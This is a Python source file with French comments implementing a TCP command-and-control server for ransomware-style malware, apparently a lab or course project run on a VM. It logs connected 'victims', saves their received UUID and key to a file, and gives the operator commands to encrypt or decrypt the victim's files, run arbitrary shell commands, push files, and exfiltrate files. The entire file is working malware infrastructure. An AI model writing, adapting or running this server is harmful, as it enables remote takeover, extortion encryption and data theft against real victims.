import socket   # Pour la communication réseau
import os       # Pour vérifier si les fichiers à envoyer existent
import datetime # Import pour gérer l'horodatage (date et heure)

# Adresse permettant d'écouter toutes les interfaces réseau de la VM
ADRESSE_IP = '0.0.0.0' 
# Le port de communication choisi pour le serveur TCP
PORT_ECOUTE = 9526 

def enregistrer_log(niveau, message):
    """ Fonction pour créer un historique des actions du serveur """
    # Récupère l'heure actuelle au format Jour/Mois/Année Heure:Minute:Seconde
    horodatage = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    
    # Prépare la ligne de log (ex: [16/01/2026 10:30] [INFO] Commande envoyée)
    ligne_log = f"[{horodatage}] [{niveau}] {message}\n"
    
    # Ouvre le fichier logs.txt en mode "a" (append) pour ajouter à la fin sans effacer le reste
    with open("logs.txt", "a") as f:
        f.write(ligne_log)

def demarrer_serveur():
    # Création du socket AF_INET = IPv4, SOCK_STREAM = TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serveur_socket:
        # Permet de relancer le script immédiatement sans attendre que le port se libère
        serveur_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Lie l'adresse IP et le port au socket créé
        serveur_socket.bind((ADRESSE_IP, PORT_ECOUTE))
        # Met le serveur en attente de connexions (mode écoute)
        serveur_socket.listen()
        print(f"Serveur en écoute sur le port {PORT_ECOUTE}...")
        
        # Enregistre le démarrage du serveur dans les logs
        enregistrer_log("SYSTEM", "Le serveur C2 a démarré et attend des victimes.")

        # accept() bloque le programme jusqu'à ce qu'un client se connecte
        connexion, adresse_client = serveur_socket.accept()
        
        with connexion:
            print(f"Victime connectée : {adresse_client}")
            # Enregistre l'adresse IP de la victime connectée
            enregistrer_log("INFO", f"Nouvelle connexion établie avec {adresse_client}")

            # Reçoit les infos d'identification (UUID et Clé)
            infos_recues = connexion.recv(1024).decode()
            print(f"Données de la victime : {infos_recues}")
            # Log des informations d'exfiltration reçues
            enregistrer_log("EXFILTRATION", f"Données reçues : {infos_recues}")

            with open("base_victimes.txt", "a") as victimes:
                victimes.write(f"{adresse_client} -> {infos_recues}\n")

            while True:
                ordre = input("Action (chiffrer/dechiffrer/system/upload/download/quitter) > ").strip().lower()

                if not ordre: 
                    continue
                
                # Envoi de l'ordre au client
                connexion.sendall(ordre.encode())
                # Log de chaque commande envoyée par l'attaquant
                enregistrer_log("ACTION", f"Commande '{ordre}' envoyée à la victime.")

                if ordre == "quitter":
                    # Log de la fermeture volontaire de session
                    enregistrer_log("SYSTEM", "Session fermée par l'attaquant.")
                    break

                if ordre == "system":
                    commande_shell = input("Commande système à envoyer : ")
                    connexion.sendall(commande_shell.encode())
                    # Log de la commande système spécifique
                    enregistrer_log("ACTION_SYSTEM", f"Exécution de : {commande_shell}")
                
                elif ordre == "upload":
                    nom_fichier = input("Fichier à envoyer au client : ")
                    connexion.sendall(nom_fichier.encode())
                    if os.path.exists(nom_fichier):
                        with open(nom_fichier, "rb") as f:
                            contenu = f.read()
                            connexion.sendall(str(len(contenu)).encode().ljust(16))
                            connexion.sendall(contenu)

                        confirmation = connexion.recv(1024).decode()
                        print("Fichier envoyé avec succès.")
                        # Log du succès de l'upload
                        enregistrer_log("INFO", f"Fichier '{nom_fichier}' envoyé avec succès au client.")
                    else:
                        print("Fichier introuvable.")
                        # Log de l'erreur si le fichier n'existe pas sur le serveur
                        enregistrer_log("ERROR", f"Échec Upload : '{nom_fichier}' est introuvable sur le serveur.")
                    continue

                elif ordre == "download":
                    nom_fichier = input("Fichier à récupérer du client : ")
                    connexion.sendall(nom_fichier.encode())
                    taille_brute = connexion.recv(16).decode().strip()
                    
                    if "ERREUR" in taille_brute:
                        print("Le client n'a pas trouvé le fichier.")
                        # Log de l'erreur côté client
                        enregistrer_log("ERROR", f"Échec Download : Le client n'a pas trouvé '{nom_fichier}'.")
                    else:
                        donnees = connexion.recv(int(taille_brute))
                        with open("DL_" + nom_fichier, "wb") as f:
                            f.write(donnees)
                        print(f"Fichier {nom_fichier} récupéré.")
                        # Log de la réussite de l'exfiltration de fichier
                        enregistrer_log("INFO", f"Fichier '{nom_fichier}' exfiltré et sauvegardé sous 'DL_{nom_fichier}'.")
                    continue

                # Réponse générale du client (chiffrement ou résultat system)
                reponse_client = connexion.recv(4096).decode()
                print(f"\n[RETOUR CLIENT] :\n{reponse_client}")
                # Log du résultat de l'action pour garder une trace du succès/échec
                enregistrer_log("RESULTAT", f"Réponse du client : {reponse_client}")

demarrer_serveur()
